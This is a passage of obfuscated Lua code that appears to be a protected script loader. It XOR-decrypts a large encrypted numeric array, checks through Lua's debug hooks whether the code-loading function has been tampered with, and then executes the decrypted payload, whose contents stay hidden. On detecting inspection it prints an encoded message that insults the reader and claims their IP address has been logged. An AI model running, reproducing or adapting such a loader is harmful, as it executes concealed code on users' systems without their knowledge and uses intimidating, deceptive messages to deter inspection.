                        [ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('8A') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('8F') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('CD') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('D2')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; ed2MzfQ4J4Ln09PMNVLQxSTTbFYpssyqwDYKELlr8B6kBzXQM3KpLhTcWFtnxlwEOs4OAynmM(
{ 1036, 1157, 917, 1203, 832, 809, 883, 1009, 746, 561, 676, 865, 1122, 991, 921, 903, 987, 648, 724, 747, 841, 1059,
  729, 745, 785, 664, 772, 1098, 834, 1043, 1174, 846, 877, 751, 1103, 645, 1171, 686, 1193, 830, 752, 726, 972, 1179,
  936, 647, 965, 623, 1005, 940, 679, 606, 767, 933, 552, 799, 1191, 1072, 640, 613, 1154, 853, 971, 715, 915, 792, 907,
  577, 594, 935, 1046, 964, 831, 1149, 1135, 1048, 925, 878, 589, 1091, 708, 1177, 675, 1192, 1084, 1212, 974, 653, 721,
  1071, 602, 1021, 876, 873, 790, 1070, 835, 845, 1044, 571, 1026, 1035, 1082, 1076, 990, 919, 1124, 1038, 615, 562,
  1028, 1016, 590, 607, 869, 1015, 1168, 605, 909, 636, 728, 977, 973, 753, 1125, 821, 1013, 667, 1023, 680, 609, 948,
  782, 796, 690, 628, 828, 1031, 952, 553, 770, 649, 1207, 1010, 1120, 1145, 1156, 1201, 677, 950, 774, 859, 996, 1153,
  1101, 1039, 959, 700, 1102, 1172, 580, 1167, 885, 1150, 1018, 910, 868, 861, 850, 554, 743, 574, 1123, 849, 1133, 1019,
  587, 1097, 1069, 1109, 980, 941, 895, 1162, 1094, 985, 1206, 805, 720, 579, 723, 913, 665, 1085, 758, 573, 1176, 833,
  929, 780, 879, 857, 614, 1008, 1053, 1205, 658, 683, 1025, 953, 893, 1106, 892, 812, 1089, 626, 979, 1077, 551, 663,
  1166, 918, 813, 604, 957, 947, 1183, 1138, 1114, 661, 1095, 899, 902, 1029, 1004, 793, 922, 629, 591, 557, 548, 956,
  1001, 1196, 843, 1093, 838, 666, 836, 1075, 722, 564, 988, 714, 1169, 1112, 968, 1202, 1141, 794, 597, 699, 697, 1189,
  1128, 844, 800, 896, 1037, 912, 771, 1027, 568, 983, 1173, 1185, 669, 1165, 625, 1208, 872, 825, 810, 707, 1067, 955,
  1126, 1041, 891, 1022, 962, 654, 1187, 678, 802, 898, 673, 761, 725, 911, 595, 1197, 766, 643, 1034, 681, 712, 711,
  847, 612, 1061, 806, 854, 713, 997, 900, 1178, 963, 916, 735, 860, 1210, 620, 610, 863, 1003, 932, 624, 856, 797, 975,
  829, 763, 727, 943, 1040, 904, 638, 671, 1119, 706, 1054, 822, 1006, 1066, 611, 897, 1000, 905, 874, 670, 652, 1188,
  840, 999, 866, 1116, 732, 1108, 754, 742, 572, 750, 764, 656, 808, 939, 632, 823, 630, 1131, 674, 842, 1144, 1140,
  1121, 634, 951, 1051, 824, 550, 946, 995, 769, 870, 815, 855, 928, 584, 783, 998, 598, 1020, 901, 696, 569, 993, 1137,
  744, 1060, 986, 927, 807, 1002, 781, 920, 651, 582, 1081, 1058, 1083, 961, 1065, 888, 1132, 566, 621, 601, 848, 1194,
  739, 1182, 1007, 740, 827, 966, 657, 788, 942, 655, 1111, 575, 816, 819, 560, 563, 1146, 703, 600, 1062, 992, 627, 633,
  1142, 1078, 1107, 757, 701, 1105, 814, 1086, 737, 1079, 1012, 773, 641, 702, 1049, 938, 741, 585, 786, 650, 1199, 565,
  978, 984, 775, 890, 688, 1045, 886, 618, 818, 1139, 567, 608, 1032, 926, 692, 687, 837, 1063, 749, 1127, 803, 1209,
  1159, 889, 738, 765, 668, 967, 646, 1118, 635, 923, 931, 1130, 1042, 736, 586, 642, 1170, 1088, 730, 791, 593, 1155,
  596, 576, 1152, 755, 1024, 588, 777, 710, 994, 704, 784, 578, 1074, 1090, 1099, 768, 1052, 1161, 1011, 778, 756, 1163,
  695, 851, 1073, 1057, 1143, 549, 1195, 616, 1047, 817, 858, -1, 47, 55, 33, 36, 134, 2, 102, 97, 105, 111, 97, 117, 5,
  29, 27, 49, 85, 90, 53, 12, 111, 30, 52, 49, 110, 48, 3, 192, 89, 98, 106, 9, 87, 32, 75, 85, 118, 99, 61, 82, 223, 84,
  14, 110, 107, 35, 5, 3, 33, 184, 121, 97, 62, 87, 7, 0, 142, 57, 126, 41, 239, 24, 48, 44, 97, 70, 127, 22, 58, 39, 37,
  126, 100, 112, 83, 100, 170, 40, 26, 55, 89, 17, 31, 105, 117, 1, 53, 77, 241, 90, 91, 101, 84, 76, 91, 60, 125, 20,
  43, 70, 82, 99, 34, 117, 122, 66, 28, 62, 53, 121, 50, 87, 121, 17, 105, 10, 158, 117, 83, 132, 22, 33, 101, 45, 44,
  98, 40, 101, 19, 29, 105, 68, 42, 61, 82, 110, 24, 95, 59, 80, 102, 33, 157, 91, 101, 93, 195, 100, 234, 82, 77, 148,
  38, 100, 33, 29, 29, 65, 24, 112, 86, 50, 106, 59, 54, 53, 162, 51, 91, 35, 84, 59, 82, 196, 188, 253, 182, 68, 44,
  110, 83, 90, 105, 24, 21, 97, 35, 82, 254, 114, 117, 202, 110, 87, 111, 21, 100, 110, 69, 118, 127, 18, 44, 46, 111,
  116, 24, 91, 98, 120, 117, 21, 82, 6, 48, 119, 44, 30, 4, 73, 108, 58, 118, 47, 85, 42, 114, 32, 44, 28, 36, 107, 48,
  31, 81, 65, 135, 22, 53, 32, 48, 117, 91, 55, 137, 82, 241, 102, 101, 49, 0, 32, 246, 21, 17, 103, 4, 24, 177, 72, 95,
  152, 77, 39, 127, 17, 5, 51, 178, 91, 120, 32, 90, 37, 34, 74, 84, 54, 63, 60, 100, 24, 82, 160, 70, 91, 114, 121, 41,
  34, 31, 33, 90, 40, 121, 49, 62, 24, 108, 70, 107, 9, 117, 24, 126, 111, 3, 98, 98, 72, 47, 89, 36, 75, 106, 81, 4, 14,
  70, 69, 32, 66, 2, 17, 54, 122, 58, 42, 97, 99, 16, 120, 89, 101, 27, 114, 75, 99, 44, 182, 5, 111, 65, 109, 242, 107,
  108, 93, 112, 119, 99, 217, 82, 35, 14, 111, 48, 2, 21, 85, 77, 24, 39, 145, 49, 23, 40, 102, 121, 50, 102, 50, 49, 91,
  42, 83, 19, 89, 41, 63, 42, 95, 24, 105, 6, 98, 109, 220, 9, 43, 1, 224, 82, 24, 211, 36, 111, 46, 121, 101, 118, 8,
  172, 17, 17, 18, 141, 41, 121, 16, 83, 54, 37, 43, 97, 233, 71, 36, 27, 32, 30, 54, 107, 97, 24, 37, 137, 170, 46, 97,
  82, 3, 90, 83, 12, 59, 27, 31, 104, 7, 43, 76, 64, 49, 36, 28, 172, 85, 60, 93, 25, 107, 90, 98, 59, 1, 97, 36, 21, 62,
  43, 1, 57, 30, 87, 18, 35, 41, 110, 26, 51, 185, 17, 43, 115, 74, 126, 42, 121, 14, 92, 49, 77, 44, 17, 5, 29, 178,
  110, 97, 155, 14, 98, 127, 73, 1, 114, 98, 4, 96, 79, 60, 102, 21, 55, 110, 84, 61, 120, 14, 122, 2, 240, 150, 120,
  122, 83, 36, 74, 38, 120, 143, 116, 87, 22, 98, 110, 29, 30, 11, 117, 84, 2, 58, 104, 111, 42, 218, 18, 86, 110, 87,
  85, 1, 209, 105, 69, 111, 24, 114, 26, 118, 57, 20, 6, 27, 2, 119, 20, 104, 70, 237, 30, 64, 20, 108, 115, 198, 59, 80,
  109, 62, 25, 90, 220, 85, 84, 57, 82, 23, 120, 38, 101, 29, 36, 106, 105, 32, 80, 24, 93, 209, 113, 112, 110, 55, 87,
  105, 91, 90, 31, 97, 81, 108, 7, 183, 10, 105, 110, 85, 101, 15, 52, 51, 36, 135, 88, 41, 91, 70, 12, 54, 93, 42, 95,
  55, 32, 97, 43, 75, 61, 49, 135, 96, 71, 60, 82, 217, 122, 74, 42, 151, 94, 146, 85, 120, 0, 84, 54, 5, 79, 71, 24,
  105, 77, 160, 15, 104, 66, 39, 21, 204, 101, 104, 101, 33, 30, 36, 33, 60 }, "utOgDjwNfAIrEYX8A1zRL5VB8U"); cXOcMDG0e0f4kP9ZtugSqB4TnkwaadHmh8m6wY5U3RYAusc2zA58jl2eBLCb27aJr =
fB8RT2MZcC1SKSMDA5OeRabgvA1graeyAxHcniDYYdYQSm0k6ZIbaUmv04ZvN4b; j5BIgYVG6iW6rCdwnu6cS3WUe93L4E2qUN8SSzuMvjxnuA5ddjn =
fB8RT2MZcC1SKSMDA5OeRabgvA1graeyAxHcniDYYdYQSm0k6ZIbaUmv04ZvN4b; pF4vCOtg0COH0V9jiMTUykQAU8GQtPjflBhQ5NxKfSK3zRm8ijjEPf68JZnV =
j5BIgYVG6iW6rCdwnu6cS3WUe93L4E2qUN8SSzuMvjxnuA5ddjn; tGx6ohIGa1DXkhi8VkQghvVzX4UrccXH7bW1z8mpDImrG3puoN6g3K =
pF4vCOtg0COH0V9jiMTUykQAU8GQtPjflBhQ5NxKfSK3zRm8ijjEPf68JZnV; nFGp68lhC4gHco2ffq95OYmr1levX4FyV3AoRr25wwwpOeSmRc4x54vIq6F =
tGx6ohIGa1DXkhi8VkQghvVzX4UrccXH7bW1z8mpDImrG3puoN6g3K; eyJSr8UWPEPHLyhGyY1RiuU34nSId1yIfbDi0OXGLfwpzf0GQi3PVroLaPC =
nFGp68lhC4gHco2ffq95OYmr1levX4FyV3AoRr25wwwpOeSmRc4x54vIq6F; xvnVXPuKuhXRAKU9otllCaLItzELM0nvIALoRjrRO8QsXf6aseRhczOkrgfhDqa9v4PqXAR74Sc =
eyJSr8UWPEPHLyhGyY1RiuU34nSId1yIfbDi0OXGLfwpzf0GQi3PVroLaPC; lxOdGYQdgnVZPI18TSp0B1FOhePCmHgWbk21K7pakozz2d6hXOYP9I5Vu14BivyHtN8AW =
xvnVXPuKuhXRAKU9otllCaLItzELM0nvIALoRjrRO8QsXf6aseRhczOkrgfhDqa9v4PqXAR74Sc; xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk = function(
  a)
  K, F = 3863363021635941, 16384 + 9706; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; b4Luy9DsBEVvZ4L6Q04GKXhSOcDVOIeEM7z4pnTFTI8immzxqplRUHgXXHZwCRV = function(b)
  co = coroutine.create(b)
  rxI7dIaZGdkjPt0abJzYK0QDhTVDCztcZT3z019xtZgENYFD5MiD3JZJNYqDoVqnnS = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(rxI7dIaZGdkjPt0abJzYK0QDhTVDCztcZT3z019xtZgENYFD5MiD3JZJNYqDoVqnnS, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return rxI7dIaZGdkjPt0abJzYK0QDhTVDCztcZT3z019xtZgENYFD5MiD3JZJNYqDoVqnnS
end; nBGdlJQ0LWrP8jhkz0xA9xsGoSXRP6dBxfZ7lXAF4XQ7M4ICNReLvNZx0AKilnYAJf = function(f, g)
  nIjmMTQ09mHab8EWhAPhuy2OUvFkPrrNRPvfnYaOV1XJqMCYWZE8f58z85iy1 = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; jTHHiVMFoUeSenbiB8M7ibSphojlhoRvcgvNU9nG9qSwlxyfucG917La9soURQkmq7d = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; m37ZEG8MQHn5GAmp8AQRwJVQE8R4GKrMn7gJHAiHBzk4MR9ixzTPN6GpLyhKQh6 = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      nIjmMTQ09mHab8EWhAPhuy2OUvFkPrrNRPvfnYaOV1XJqMCYWZE8f58z85iy1(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; l4VQ1oysZ1VjwlTnrOpC02rpfsv4ecjnJSEsRTuQ74H8zz4G6QTLSUmMlM7J3teQvye = function(p, n)
    yKGcZYOYnim2HFHCeQoh5BI8JhZ91mCvDK3NoQH92PxsYTqg2WuoATDG0KJzwDnvaWXqzi1jfx = ""
    for k, q in pairs(p) do yKGcZYOYnim2HFHCeQoh5BI8JhZ91mCvDK3NoQH92PxsYTqg2WuoATDG0KJzwDnvaWXqzi1jfx =
      yKGcZYOYnim2HFHCeQoh5BI8JhZ91mCvDK3NoQH92PxsYTqg2WuoATDG0KJzwDnvaWXqzi1jfx ..
      lxOdGYQdgnVZPI18TSp0B1FOhePCmHgWbk21K7pakozz2d6hXOYP9I5Vu14BivyHtN8AW
      [xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('D2') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('D7') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('CD') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('A0') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('B9') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('96')]
      [xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('82') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('9B') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('78') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('CD')](
      q) end
    ; n(yKGcZYOYnim2HFHCeQoh5BI8JhZ91mCvDK3NoQH92PxsYTqg2WuoATDG0KJzwDnvaWXqzi1jfx)
  end; jTHHiVMFoUeSenbiB8M7ibSphojlhoRvcgvNU9nG9qSwlxyfucG917La9soURQkmq7d(f,
    function(r) m37ZEG8MQHn5GAmp8AQRwJVQE8R4GKrMn7gJHAiHBzk4MR9ixzTPN6GpLyhKQh6(r, g,
        function(s) l4VQ1oysZ1VjwlTnrOpC02rpfsv4ecjnJSEsRTuQ74H8zz4G6QTLSUmMlM7J3teQvye(s,
            function(t) if #b4Luy9DsBEVvZ4L6Q04GKXhSOcDVOIeEM7z4pnTFTI8immzxqplRUHgXXHZwCRV(lxOdGYQdgnVZPI18TSp0B1FOhePCmHgWbk21K7pakozz2d6hXOYP9I5Vu14BivyHtN8AW[xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('AF') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('BE') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('78') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('87')]) == 1 then if lxOdGYQdgnVZPI18TSp0B1FOhePCmHgWbk21K7pakozz2d6hXOYP9I5Vu14BivyHtN8AW[xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('AF') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('BE') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('78') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('87')] == lxOdGYQdgnVZPI18TSp0B1FOhePCmHgWbk21K7pakozz2d6hXOYP9I5Vu14BivyHtN8AW[xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('C3') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('CD') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('A0') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('B9') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('D7')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if lxOdGYQdgnVZPI18TSp0B1FOhePCmHgWbk21K7pakozz2d6hXOYP9I5Vu14BivyHtN8AW[xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('AF') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('BE') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('78') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('87')](t) then
                    lxOdGYQdgnVZPI18TSp0B1FOhePCmHgWbk21K7pakozz2d6hXOYP9I5Vu14BivyHtN8AW
                        [xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('AF') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('BE') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('78') .. xf7uIUnm0XBFpjmtWSMLUY8joINxPB0Rhk09MmHxui2VhxJ6IAZxffsEfMFVlIVk9lKhk('87')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; nBGdlJQ0LWrP8jhkz0xA9xsGoSXRP6dBxfZ7lXAF4XQ7M4ICNReLvNZx0AKilnYAJf(
{ 581, 776, 595, 867, 585, 940, 1127, 922, 772, 609, 916, 1064, 707, 1069, 635, 711, 634, 917, 1084, 831, 780, 688, 944,
  1113, 995, 754, 854, 1099, 698, 545, 562, 673, 862, 869, 974, 978, 826, 745, 883, 1060, 948, 548, 769, 782, 956, 892,
  960, 872, 642, 715, 551, 1077, 1019, 726, 572, 877, 652, 1110, 970, 942, 994, 946, 570, 910, 799, 833, 1008, 599, 996,
  856, 575, 1012, 1170, 866, 1037, 896, 943, 1191, 935, 621, 702, 959, 547, 701, 1180, 909, 921, 1089, 814, 1124, 1015,
  699, 732, 600, 1194, 828, 900, 774, 620, 646, 683, 911, 1022, 827, 811, 669, 993, 1020, 878, 1138, 1136, 1070, 1042,
  1148, 868, 847, 611, 1112, 593, 835, 651, 730, 857, 704, 684, 938, 686, 759, 1096, 775, 1010, 1025, 629, 1185, 967,
  749, 881, 1106, 1013, 853, 1153, 550, 1208, 743, 899, 763, 770, 897, 1057, 1211, 731, 836, 1024, 953, 576, 1093, 1159,
  1134, 658, 1055, 664, 783, 1009, 712, 667, 926, 1039, 845, 637, 980, 567, 696, 972, 602, 582, 709, 875, 1056, 1143,
  1162, 930, 1133, 861, 741, 937, 703, 659, 1141, 1059, 627, 1205, 905, 752, 671, 812, 1049, 574, 710, 969, 858, 590,
  592, 908, 638, 999, 846, 1126, 891, 796, 990, 1045, 610, 889, 1005, 1097, 809, 1184, 1139, 817, 830, 818, 625, 1140,
  619, 762, 580, 1091, 928, 566, 1135, 1171, 1053, 860, 561, 1149, 963, 552, 803, 798, 705, 971, 871, 1051, 672, 1001,
  721, 918, 1166, 1187, 643, 1018, 1147, 1000, 1073, 973, 768, 694, 697, 927, 1006, 1068, 761, 1014, 656, 612, 586, 1030,
  807, 979, 1076, 588, 914, 893, 968, 986, 1201, 1040, 1002, 549, 1172, 1151, 1023, 920, 554, 786, 716, 687, 961, 661,
  874, 613, 848, 822, 1174, 1137, 1175, 750, 1103, 1204, 898, 1157, 633, 924, 653, 1212, 1031, 919, 1092, 987, 558, 738,
  766, 645, 1177, 915, 880, 675, 1047, 1072, 1082, 951, 1028, 912, 913, 544, 984, 829, 739, 1067, 1195, 657, 1169, 553,
  753, 563, 729, 724, 1046, 1146, 793, 887, 998, 850, 706, 648, 587, 945, 1120, 1062, 630, 982, 1202, 1036, 1032, 810,
  1158, 1156, 605, 797, 758, 719, 616, 789, 820, 955, 1085, 1163, 788, 806, 649, 1116, 1058, 907, 735, 932, 1088, 870,
  1207, 617, 757, 965, 765, 720, 1003, 1144, 976, 773, 626, 760, 1054, 1155, 1114, 1095, 876, 1108, 840, 823, 690, 559,
  557, 714, 792, 1152, 607, 614, 1087, 628, 886, 1122, 895, 985, 1200, 1061, 879, 890, 1181, 1183, 623, 569, 771, 1150,
  1105, 1188, 601, 834, 962, 1104, 650, 929, 1199, 802, 1034, 966, 543, 952, 784, 1186, 954, 808, 746, 1132, 958, 615,
  1081, 983, 636, 682, 564, 662, 555, 681, 1094, 1167, 1090, 1128, 949, 882, 740, 1168, 1209, 1083, 1154, 689, 804, 647,
  977, 693, 578, 1026, 939, 851, 1178, 742, 936, 849, 925, 1142, 1038, 622, 1189, 1078, 815, 1192, 691, 933, 1029, 1161,
  674, 981, 1098, 1044, 589, 791, 841, 777, 713, 604, 767, 934, 957, 950, 597, 1007, 816, 584, 573, 873, 790, 598, 641,
  1173, 781, 1033, 947, 639, 722, 894, 1193, 1074, 888, 632, 1119, 1050, 565, 1131, 755, 596, 568, 727, 844, 666, 546,
  989, 603, 1125, 778, 801, 906, 779, 901, 737, 708, -1, 7, 50, 77, 49, 93, 120, 16, 11, 70, 71, 113, 33, 25, 9, 47, 48,
  46, 178, 13, 70, 71, 35, 0, 35, 112, 87, 23, 8, 245, 23, 69, 111, 26, 74, 168, 32, 254, 66, 122, 82, 88, 79, 85, 50, 3,
  10, 117, 68, 165, 12, 39, 233, 82, 93, 87, 59, 43, 112, 87, 80, 75, 82, 20, 80, 0, 48, 62, 66, 37, 29, 87, 58, 94, 117,
  119, 215, 120, 33, 56, 79, 94, 118, 109, 117, 79, 55, 88, 111, 23, 80, 45, 38, 38, 22, 112, 116, 62, 157, 55, 8, 98,
  50, 92, 63, 5, 81, 118, 69, 99, 65, 1, 108, 204, 2, 85, 16, 31, 236, 8, 24, 185, 20, 192, 42, 118, 73, 51, 247, 66, 98,
  35, 62, 75, 31, 58, 117, 249, 55, 61, 71, 29, 120, 143, 2, 24, 53, 35, 87, 120, 135, 18, 20, 73, 105, 48, 89, 71, 211,
  62, 77, 66, 19, 32, 37, 5, 55, 24, 127, 45, 80, 116, 23, 57, 53, 167, 205, 71, 85, 13, 55, 137, 70, 108, 33, 125, 254,
  117, 95, 118, 106, 214, 232, 106, 156, 63, 20, 113, 52, 102, 19, 23, 142, 76, 49, 88, 43, 58, 79, 30, 67, 115, 49, 53,
  231, 120, 115, 59, 10, 61, 99, 49, 204, 66, 55, 11, 54, 99, 49, 69, 18, 21, 19, 79, 4, 80, 127, 127, 113, 6, 1, 100, 9,
  154, 72, 190, 88, 5, 71, 70, 17, 116, 68, 152, 72, 113, 86, 35, 147, 100, 52, 55, 105, 78, 19, 26, 8, 80, 99, 80, 101,
  11, 10, 71, 106, 79, 56, 28, 42, 81, 83, 31, 166, 209, 13, 42, 78, 36, 1, 9, 231, 15, 122, 44, 98, 235, 169, 5, 56,
  101, 39, 254, 13, 81, 114, 6, 108, 81, 75, 30, 5, 106, 25, 243, 1, 93, 69, 198, 11, 87, 29, 16, 171, 4, 108, 23, 28,
  91, 119, 18, 63, 119, 12, 118, 23, 6, 19, 124, 0, 93, 127, 93, 231, 155, 1, 67, 101, 0, 70, 118, 28, 34, 2, 28, 121,
  17, 71, 54, 85, 81, 121, 44, 190, 109, 75, 122, 99, 5, 69, 117, 14, 1, 6, 67, 27, 17, 35, 62, 2, 63, 26, 57, 45, 87,
